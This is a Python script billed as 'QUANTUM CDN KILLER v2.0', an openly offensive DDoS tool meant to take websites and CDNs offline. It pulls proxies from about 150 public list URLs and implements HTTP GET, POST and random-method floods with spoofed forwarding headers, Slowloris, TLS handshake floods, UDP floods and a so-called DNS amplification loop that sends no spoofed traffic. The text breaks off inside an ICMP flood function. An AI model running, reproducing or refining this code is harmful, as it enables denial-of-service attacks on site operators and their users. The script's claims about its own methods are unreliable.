#!/usr/bin/env python3
# ============================================================
# QUANTUM CDN KILLER v2.0
# DDoS Attack — Bikin Down CDN/Web
# 10 Layer Attack · Proxy Scraper · Multi-Thread
# Run: python cdn_killer.py
# ============================================================

import os
import sys
import time
import random
import threading
import socket
import ssl
import http.client
import requests
from urllib.parse import urlparse
from datetime import datetime
import json
import re
import hashlib
import base64
import struct
import subprocess
import queue

# ============================================================
# KONFIGURASI
# ============================================================
VERSION = "2.0"
AUTHOR = "QUANTUM"

# ============================================================
# COLORS
# ============================================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BLINK = '\033[5m'

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear()
    print(f"""
{Colors.RED}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║                                                                  ║
║  {Colors.CYAN}██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗{Colors.RED}  ║
║  {Colors.CYAN}██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║{Colors.RED}  ║
║  {Colors.CYAN}██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║{Colors.RED}  ║
║  {Colors.CYAN}██╔═══╝ ██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║{Colors.RED}  ║
║  {Colors.CYAN}██║     ╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║{Colors.RED}  ║
║  {Colors.CYAN}╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{Colors.RED}  ║
║                                                                  ║
║  {Colors.YELLOW}✦  QUANTUM CDN KILLER v{VERSION} ✦{Colors.RED}                          ║
║  {Colors.GREEN}💀 DDoS Attack — Bikin Down CDN/Web 💀{Colors.RED}                   ║
║  {Colors.MAGENTA}🔥 10 Layer · Proxy Scraper · Multi-Thread 🔥{Colors.RED}           ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}
    """)

# ============================================================
# PROXY SOURCES — 100+ SOURCES
# ============================================================
PROXY_SOURCES = [
    # API Sources
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=us',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=id',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=de',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=fr',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=gb',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ca',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=au',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=jp',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=kr',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=br',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ru',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=in',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=vn',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=my',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=sg',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=nl',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=pl',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ua',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=cz',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=gr',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=pt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=se',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=no',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=dk',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=fi',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ch',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=at',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=be',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=hu',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ro',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=bg',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=rs',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=hr',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=sk',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=si',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=lt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=lv',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ee',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=za',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=eg',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=sa',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ae',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=il',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=tr',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=th',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=ph',
    
    # Geonode
    'https://proxylist.geonode.com/api/proxy-list?limit=500&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=2&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=3&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=4&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=5&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=6&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=7&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=8&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=9&sort_by=lastChecked&format=textplain',
    'https://proxylist.geonode.com/api/proxy-list?limit=500&page=10&sort_by=lastChecked&format=textplain',
    
    # Open Proxy List
    'https://openproxylist.xyz/http.txt',
    'https://openproxylist.xyz/https.txt',
    'https://openproxylist.xyz/socks4.txt',
    'https://openproxylist.xyz/socks5.txt',
    
    # Proxy Space
    'https://proxyspace.pro/http.txt',
    'https://proxyspace.pro/https.txt',
    'https://proxyspace.pro/socks4.txt',
    'https://proxyspace.pro/socks5.txt',
    
    # Rootjazz
    'http://rootjazz.com/proxies/proxies.txt',
    
    # PubProxy
    'http://pubproxy.com/api/proxy?limit=20&format=txt&type=http',
    'http://pubproxy.com/api/proxy?limit=20&format=txt&type=https',
    'http://pubproxy.com/api/proxy?limit=20&format=txt&type=socks4',
    'http://pubproxy.com/api/proxy?limit=20&format=txt&type=socks5',
    
    # GitHub — ErcinDedeoglu
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt',
    
    # GitHub — Zaeem20
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt',
    
    # GitHub — monosans
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/https.txt',
    
    # GitHub — officialputuid
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt',
    
    # GitHub — TheSpeedX
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
    
    # GitHub — mmpx12
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt',
    
    # GitHub — vakhov
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt',
    
    # GitHub — zloi-user
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt',
    
    # GitHub — elliottophellia
    'https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt',
    'https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/https/global/https_checked.txt',
    
    # GitHub — roosterkid
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    
    # GitHub — mertguvencli
    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
    
    # GitHub — jetkai
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt',
    
    # GitHub — shiftytr
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
    
    # GitHub — clarketm
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    
    # Proxy List Download
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://www.proxy-list.download/api/v1/get?type=socks4',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    
    # Proxy Scan
    'https://www.proxyscan.io/download?type=http',
    'https://www.proxyscan.io/download?type=https',
    'https://www.proxyscan.io/download?type=socks4',
    'https://www.proxyscan.io/download?type=socks5',
    
    # API Open Proxy List
    'https://api.openproxylist.xyz/http.txt',
    'https://api.openproxylist.xyz/https.txt',
    'https://api.openproxylist.xyz/socks4.txt',
    'https://api.openproxylist.xyz/socks5.txt',
    
    # MultiProxy
    'https://multiproxy.org/txt_all/proxy.txt',
    
    # GitHub — rx443
    'https://raw.githubusercontent.com/rx443/proxy-list/main/online/http.txt',
    'https://raw.githubusercontent.com/rx443/proxy-list/main/online/https.txt',
    
    # GitHub — Anonym0usWork1221
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt',
    
    # GitHub — MrMarble
    'https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt',
    
    # GitHub — ProxyScraper
    'https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt',
    'https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/https.txt',
    
    # GitHub — TuanMinPay
    'https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/http.txt',
    
    # GitHub — zevtyardt
    'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
    
    # GitHub — miyukii-chan
    'https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/http.txt',
    'https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/https.txt',
    
    # GitHub — mishakorzik
    'https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt',
    
    # GitHub — hyperbeats
    'https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt',
    
    # GitHub — MuRongPIG
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    
    # GitHub — j0rd1s3rr4n0
    'https://raw.githubusercontent.com/j0rd1s3rr4n0/api/main/proxy/http.txt',
    
    # GitHub — UptimerBot
    'https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/https.txt',
    
    # GitHub — rdavydov
    'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/https.txt',
    'https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies_anonymous/http.txt',
    
    # GitHub — prxchk
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt',
    
    # GitHub — saisuiu
    'https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/cnfree.txt',
    
    # GitHub — almroot
    'https://raw.githubusercontent.com/almroot/proxylist/master/list.txt',
    
    # GitHub — aslisk
    'https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt',
    
    # GitHub — B4RC0DE-TM
    'https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt',
    
    # GitHub — caliphdev
    'https://raw.githubusercontent.com/caliphdev/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/caliphdev/Proxy-List/master/https.txt',
    
    # GitHub — casals-ar
    'https://raw.githubusercontent.com/casals-ar/proxy-list/main/http.txt',
    
    # GitHub — Cr4ckC4t
    'https://raw.githubusercontent.com/Cr4ckC4t/proxy-list/main/proxies/http/latest.txt',
    
    # GitHub — ethkav03
    'https://raw.githubusercontent.com/ethkav03/proxy-list/main/proxy_list.txt',
    
    # GitHub — fahimscirex
    'https://raw.githubusercontent.com/fahimscirex/proxybd/master/proxylist/http.txt',
    
    # GitHub — hendrikbgr
    'https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt',
    
    # GitHub — im-razvan
    'https://raw.githubusercontent.com/im-razvan/proxy_list/main/http.txt',
    
    # GitHub — IshanArya
    'https://raw.githubusercontent.com/IshanArya/proxy-list/master/proxyList.txt',
    
    # GitHub — JKajas
    'https://raw.githubusercontent.com/JKajas/proxy-list/main/http.txt',
    
    # GitHub — kenzok78
    'https://raw.githubusercontent.com/kenzok78/proxy/main/http.txt',
    
    # GitHub — manuGMG
    'https://raw.githubusercontent.com/manuGMG/proxy-365/main/HTTP.txt',
    'https://raw.githubusercontent.com/manuGMG/proxy-365/main/HTTPS.txt',
    
    # GitHub — Nspire-Modding-Group
    'https://raw.githubusercontent.com/Nspire-Modding-Group/ProxyList/main/proxies.txt',
    
    # GitHub — nx4n
    'https://raw.githubusercontent.com/nx4n/proxy-list/main/http.txt',
    
    # GitHub — proxy4parsing
    'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
    
    # GitHub — proxylist-to
    'https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt',
    
    # GitHub — RX4096
    'https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt',
    'https://raw.githubusercontent.com/RX4096/proxy-list/main/online/all.txt',
    
    # GitHub — Speedoney
    'https://raw.githubusercontent.com/Speedoney/proxy-list/main/http.txt',
    
    # GitHub — tariqkiranc
    'https://raw.githubusercontent.com/tariqkiranc/proxy/main/https.txt',
    
    # GitHub — UserR3X
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https+.txt',
    
    # GitHub — volodya-lombrozo
    'https://raw.githubusercontent.com/volodya-lombrozo/proxy-list/main/proxy-list.txt',
    
    # GitHub — yemixzy
    'https://raw.githubusercontent.com/yemixzy/proxy-list/main/proxies/http.txt',
    
    # GitHub — Zy3kR
    'https://raw.githubusercontent.com/Zy3kR/proxy-list/main/http.txt',
    
    # GitHub — yuceltoluyag
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    
    # GitHub — Fect-lang
    'https://raw.githubusercontent.com/Fect-lang/proxy-list/main/http.txt',
    
    # GitHub — dpangestuw
    'https://raw.githubusercontent.com/dpangestuw/Free-Proxy/main/http_proxies.txt',
]

# ============================================================
# PROXY MANAGER
# ============================================================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.index = 0
        self.lock = threading.Lock()
        self.load()
    
    def load(self):
        try:
            with open('proxy.txt', 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{Colors.GREEN}[+] Loaded {len(self.proxies)} proxies{Colors.END}")
            return len(self.proxies)
        except:
            self.proxies = []
            return 0
    
    def fetch(self):
        all_proxies = set()
        total = len(PROXY_SOURCES)
        print(f"{Colors.BLUE}[*] Fetching proxies from {total} sources...{Colors.END}")
        
        for i, url in enumerate(PROXY_SOURCES):
            try:
                print(f"{Colors.DIM}[{i+1}/{total}] {url[:50]}...{Colors.END}")
                r = requests.get(url, timeout=15)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line:
                            all_proxies.add(line)
                time.sleep(0.2)
            except:
                pass
        
        with open('proxy.txt', 'w') as f:
            f.write('\n'.join(all_proxies))
        self.proxies = list(all_proxies)
        print(f"{Colors.GREEN}[+] Total proxies: {len(self.proxies)}{Colors.END}")
        return len(self.proxies)
    
    def get(self):
        if not self.proxies:
            return None
        with self.lock:
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            parts = proxy.split(':')
            if len(parts) == 2:
                return parts[0], int(parts[1])
            return None
    
    def count(self):
        return len(self.proxies)

# ============================================================
# DDOS ENGINE — CDN KILLER (FIXED)
# ============================================================
class CDNKiller:
    def __init__(self, target, duration, threads, proxy_manager):
        self.target = target
        self.duration = duration
        self.threads = threads
        self.proxy_manager = proxy_manager
        self.running = True
        self.stats = {'sent': 0, 'failed': 0}
        self.lock = threading.Lock()
        self.parsed = urlparse(target)
        self.host = self.parsed.hostname
        self.port = self.parsed.port or (443 if self.parsed.scheme == 'https' else 80)
        self.path = self.parsed.path or '/'
        self.scheme = self.parsed.scheme or 'http'
    
    def random_ua(self):
        ua = [
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100,120)}.0.0.0",
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/{random.randint(80,100)}.0",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/604.1",
            f"Mozilla/5.0 (Linux; Android 13) Chrome/{random.randint(100,120)}.0.0.0",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) Safari/604.1"
        ]
        return random.choice(ua)
    
    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    
    # ============================================================
    # LAYER 1: HTTP/2 FLOOD (CDN KILLER) — FIXED
    # ============================================================
    def http2_flood(self):
        while self.running:
            try:
                proxy = self.proxy_manager.get()
                
                if self.scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    if proxy:
                        conn = http.client.HTTPSConnection(proxy[0], proxy[1], context=ctx, timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=5)
                else:
                    if proxy:
                        conn = http.client.HTTPConnection(proxy[0], proxy[1], timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                
                path = self.path + '?' + str(random.randint(1,999999)) + '=' + str(random.randint(1,999999))
                headers = {
                    'Host': self.host,
                    'User-Agent': self.random_ua(),
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Connection': 'keep-alive',
                    'X-Forwarded-For': self.random_ip(),
                    'X-Real-IP': self.random_ip(),
                    'CF-Connecting-IP': self.random_ip(),
                    'X-Requested-With': 'XMLHttpRequest',
                    'Upgrade-Insecure-Requests': '1',
                }
                conn.request('GET', path, headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 2: HTTP POST FLOOD — FIXED
    # ============================================================
    def http_post_flood(self):
        while self.running:
            try:
                proxy = self.proxy_manager.get()
                
                if self.scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    if proxy:
                        conn = http.client.HTTPSConnection(proxy[0], proxy[1], context=ctx, timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=5)
                else:
                    if proxy:
                        conn = http.client.HTTPConnection(proxy[0], proxy[1], timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                
                path = self.path + '?' + str(random.randint(1,999999))
                headers = {
                    'Host': self.host,
                    'User-Agent': self.random_ua(),
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'X-Forwarded-For': self.random_ip(),
                    'X-Real-IP': self.random_ip(),
                }
                body = 'data=' + 'a' * random.randint(1000, 5000)
                conn.request('POST', path, body=body, headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 3: RANDOM METHOD FLOOD — FIXED
    # ============================================================
    def random_method_flood(self):
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
        while self.running:
            try:
                proxy = self.proxy_manager.get()
                method = random.choice(methods)
                
                if self.scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    if proxy:
                        conn = http.client.HTTPSConnection(proxy[0], proxy[1], context=ctx, timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPSConnection(self.host, self.port, context=ctx, timeout=5)
                else:
                    if proxy:
                        conn = http.client.HTTPConnection(proxy[0], proxy[1], timeout=5)
                        conn.set_tunnel(self.host, self.port)
                    else:
                        conn = http.client.HTTPConnection(self.host, self.port, timeout=5)
                
                path = self.path + '?' + str(random.randint(1,999999))
                headers = {
                    'Host': self.host,
                    'User-Agent': self.random_ua(),
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'X-Forwarded-For': self.random_ip(),
                }
                conn.request(method, path, headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 4: SLOWLORIS — FIXED
    # ============================================================
    def slowloris(self):
        while self.running:
            try:
                proxy = self.proxy_manager.get()
                if proxy:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((proxy[0], proxy[1]))
                    sock.send(f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode())
                    sock.recv(1024)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.host, self.port))
                
                sock.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.host}\r\n".encode())
                sock.send(f"User-Agent: {self.random_ua()}\r\n".encode())
                
                for i in range(15):
                    sock.send(f"X-Header-{i}: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(0.2)
                
                sock.send(b"\r\n")
                sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 5: SSL/TLS FLOOD — FIXED
    # ============================================================
    def ssl_flood(self):
        while self.running:
            try:
                proxy = self.proxy_manager.get()
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                if proxy:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((proxy[0], proxy[1]))
                    sock.send(f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode())
                    sock.recv(1024)
                    ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.host, self.port))
                    ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host)
                
                ssl_sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 6: UDP FLOOD — FIXED
    # ============================================================
    def udp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = os.urandom(65500)
                sock.sendto(data, (self.host, self.port))
                sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 7: DNS AMPLIFICATION — FIXED
    # ============================================================
    def dns_amplification(self):
        dns_servers = [
            '8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222',
            '8.26.56.26', '208.67.220.220', '64.6.64.6', '8.20.247.20',
            '156.154.70.1', '156.154.71.1', '199.85.126.10', '199.85.127.10'
        ]
        while self.running:
            try:
                dns = random.choice(dns_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1)
                
                query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                query += b'\x03' + self.host.replace('.', '').encode()[:20]
                query += b'\x00\x00\x01\x00\x01'
                
                sock.sendto(query, (dns, 53))
                sock.close()
                with self.lock:
                    self.stats['sent'] += 1
            except:
                with self.lock:
                    self.stats['failed'] += 1
    
    # ============================================================
    # LAYER 8: ICMP FLOOD — FIXED
    # ============================================================
    def icmp_flood(self):
        while self.running:
            try:
